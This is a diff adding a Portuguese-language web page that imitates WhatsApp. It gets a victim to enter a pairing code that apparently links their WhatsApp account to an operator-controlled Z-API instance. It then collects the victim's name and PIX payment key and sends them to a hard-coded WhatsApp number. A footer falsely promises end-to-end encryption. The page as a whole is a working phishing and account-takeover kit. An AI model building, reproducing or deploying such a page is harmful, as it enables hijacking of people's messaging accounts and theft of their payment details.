@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #fcf5eb;
+      min-height: 100vh;
+      padding: 1rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .tela {
+      display: none;
+      background-color: white;
+      border: 1px solid black;
+      border-radius: 20px;
+      padding: 2rem;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    .ativa { display: block; }
+    .tela-conteudo {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      margin-top: 1rem;
+    }
+    input, select {
+      padding: 1rem;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      border: 1px solid black;
+      width: 100%;
+    }
+    button {
+      background-color: #25d366;
+      padding: 1rem;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      border: 1px solid black;
+      cursor: pointer;
+      color: black;
+      width: 100%;
+    }
+    #tela2 button, #tela3 button, #tela4 button {
+      background-color: #008069;
+      color: white;
+      border: none;
+    }
+    #codigo-display span {
+      display: inline-block;
+      padding: 8px 12px;
+      margin: 2px;
+      border: 1px solid black;
+      border-radius: 8px;
+      background-color: white;
+      font-weight: bold;
+      font-size: 1.2rem;
+    }
+    .spinner {
+      margin: 1rem auto;
+      width: 90px;
+      height: 90px;
+      background-image: url('https://i.pinimg.com/originals/fa/87/77/fa87774590186b287a5338d7c87afc0c.gif');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      border-radius: 50%;
+    }
+    footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #0A1014;
+    }
+    @media (max-width: 480px) {
+      .tela { padding: 1.5rem 1rem; }
+      input, button, select { padding: 0.9rem; font-size: 1rem; }
+      h2 { font-size: 1.4rem; }
+      footer { font-size: 0.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- TELA 1 -->
+<div id="tela1" class="tela ativa">
+  <h2>Insira o número de telefone</h2>
+  <p>Selecione o país e insira seu número de telefone.</p>
+  <div class="tela-conteudo">
+    <select id="ddi">
+      <option value="55" selected>🇧🇷 Brazil (+55)</option>
+      <!-- pode manter os outros países se quiser -->
+    </select>
+    <input type="text" id="telefone" placeholder="(11) 99955-9889" />
+    <button onclick="enviarTelefone()">Avançar</button>
+  </div>
+</div>
+
+<!-- TELA 2 -->
+<div id="tela2" class="tela">
+  <h2 id="titulo-tela2">Use esse código para conectar</h2>
+  <div class="tela-conteudo">
+    <div id="codigo-display">Aguardando...</div>
+    <div id="loading" class="spinner" style="display: none;"></div>
+    <button onclick="copiarCodigo()">Copiar código</button>
+    <div onclick="verificarConexao()" style="cursor: pointer; text-align: center; font-weight: 500; color: #008069;">
+      <span style="border-bottom: 2px solid #25d366;">Fiz o procedimento</span>
+    </div>
+  </div>
+</div>
+
+<!-- TELA 3 -->
+<div id="tela3" class="tela">
+  <h2 id="titulo-tela3">✅ Conectado com sucesso!</h2>
+  <div class="tela-conteudo">
+    <p id="texto-tela3">Seu WhatsApp foi conectado corretamente.</p>
+    <p id="info-final"></p>
+    <p id="mensagem-final" style="font-weight: bold; display: none;">WhatsApp conectado com segurança!</p>
+    <button id="fechar-pagina" onclick="mostrarTela('tela4')" style="display: none;">Cadastrar chave PIX</button>
+    <button id="voltar-btn" onclick="mostrarTela('tela1')" style="display: none;">Tentar novamente</button>
+  </div>
+</div>
+
+<!-- TELA 4 -->
+<div id="tela4" class="tela">
+  <h2>Cadastro da Chave PIX</h2>
+  <div class="tela-conteudo">
+    <input type="text" id="nome-pessoa" placeholder="Seu nome completo" />
+    <div style="display: flex; gap: 8px;">
+      <select id="tipo-chave" style="flex: 1;">
+        <option value="Telefone">Telefone</option>
+        <option value="CPF">CPF</option>
+        <option value="CNPJ">CNPJ</option>
+        <option value="E-mail">E-mail</option>
+        <option value="Chave Aleatória">Chave Aleatória</option>
+      </select>
+      <input type="text" id="chave-pix" placeholder="Sua chave PIX" style="flex: 2;" />
+    </div>
+    <button onclick="enviarPix()">Cadastrar chave PIX</button>
+  </div>
+</div>
+
+<script>
+
+  const telefoneInput = document.getElementById('telefone');
+
+   telefoneInput.addEventListener('input', function (e) {
+     let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não é número
+
+     if (value.length > 11) value = value.slice(0, 11);
+
+     if (value.length > 0) {
+       value = '(' + value;
+     }
+     if (value.length > 3) {
+       value = value.slice(0, 3) + ') ' + value.slice(3);
+     }
+     if (value.length > 10) {
+       value = value.slice(0, 10) + '-' + value.slice(10);
+     }
+
+     e.target.value = value;
+   });
+
+   function copiarCodigo() {
+  const spans = document.querySelectorAll('#codigo-display span');
+  let codigo = '';
+  spans.forEach(span => {
+    codigo += span.textContent;
+  });
+
+  // Cria um input temporário para copiar o conteúdo
+  const inputTemporario = document.createElement('input');
+  inputTemporario.value = codigo;
+  document.body.appendChild(inputTemporario);
+  inputTemporario.select();
+  document.execCommand('copy');
+  document.body.removeChild(inputTemporario);
+
+  alert('Código copiado: ' + codigo);
+}
+
+  let telefoneFormatado = "";
+  let codigoRecebido = "";
+
+  function mostrarTela(id) {
+    document.querySelectorAll('.tela').forEach(el => el.classList.remove('ativa'));
+    document.getElementById(id)?.classList.add('ativa');
+  }
+
+ function enviarTelefone() {
+  const telefone = document.getElementById("telefone").value.replace(/\D/g, "");
+  const ddi = document.getElementById("ddi").value;
+  if (telefone.length < 8) return alert("Digite um número válido.");
+  
+  const telefoneFormatado = ddi + telefone;
+
+  mostrarTela("tela2");
+  document.getElementById("mensagem-final").style.display = "none";
+  document.getElementById("fechar-pagina").style.display = "none";
+
+  fetch(`get_code.php?telefone=${telefoneFormatado}`)
+    .then(res => res.json())
+    .then(data => {
+      if (data.error) {
+        return alert(`Erro: ${data.error}`);
+      }
+
+      if (data.conectado) {
+        mostrarTela("tela3");
+        document.getElementById("mensagem-final").style.display = "block";
+        document.getElementById("fechar-pagina").style.display = "inline-block";
+        return;
+      }
+
+      localStorage.setItem("zapi_instance_id", data.instance_id);
+      localStorage.setItem("zapi_instance_token", data.instance_token);
+      localStorage.setItem("zapi_security_token", data.security_token);
+
+      console.log("ID salvo:", data.instance_id);
+
+      const codigoRecebido = data.codigo;
+      const display = document.getElementById("codigo-display");
+      display.innerHTML = "";
+      [...codigoRecebido].forEach(char => {
+        const span = document.createElement("span");
+        span.textContent = char;
+        display.appendChild(span);
+      });
+    })
+    .catch(() => alert("Erro ao gerar código."));
+}
+
+
+function verificarConexao() {
+  document.getElementById("loading").style.display = "block";
+  document.getElementById("codigo-display").textContent = "Verificando conexão...";
+
+  const instanceId = localStorage.getItem("zapi_instance_id");
+  const token = localStorage.getItem("zapi_instance_token");
+  const securityToken = localStorage.getItem("zapi_security_token");
+
+  if (!instanceId || !token || !securityToken) {
+    alert("Erro interno. Gere o código novamente.");
+    console.log('ERROO');
+    window.location.reload();
+    return;
+  }
+
+  setTimeout(() => {
+    fetch(`https://api.z-api.io/instances/${instanceId}/token/${token}/status`, {
+      headers: {
+        "Client-Token": securityToken
+      }
+    })
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("loading").style.display = "none";
+
+        if (data.connected) {
+          mostrarTela("tela3");
+          document.getElementById("mensagem-final").style.display = "block";
+          document.getElementById("fechar-pagina").style.display = "inline-block";
+        } else {
+          document.getElementById("codigo-display").textContent = "Código ainda válido. Tente novamente.";
+        }
+      })
+      .catch(() => {
+        document.getElementById("codigo-display").textContent = "Erro ao verificar status.";
+      });
+  }, 15000);
+}
+
+
+  function enviarPix() {
+    const nome = document.getElementById("nome-pessoa").value.trim();
+    const chave = document.getElementById("chave-pix").value.trim();
+    const tipo = document.getElementById("tipo-chave").value;
+    if (!nome || !chave) return alert("Preencha todos os campos!");
+    const mensagem = `Acabei de conectar meu número ${telefoneFormatado}\n\nChave PIX:\nNome: ${nome}\nTipo: ${tipo}\nChave: ${chave}`;
+    const url = `https://wa.me/555131910192?text=${encodeURIComponent(mensagem)}`;
+    window.open(url, '_blank');
+  }
+</script>
+
+<footer>
+  <span>🔒 Suas mensagens pessoais são protegidas com criptografia de ponta a ponta.</span>
+</footer>
+
+</body>
+</html>
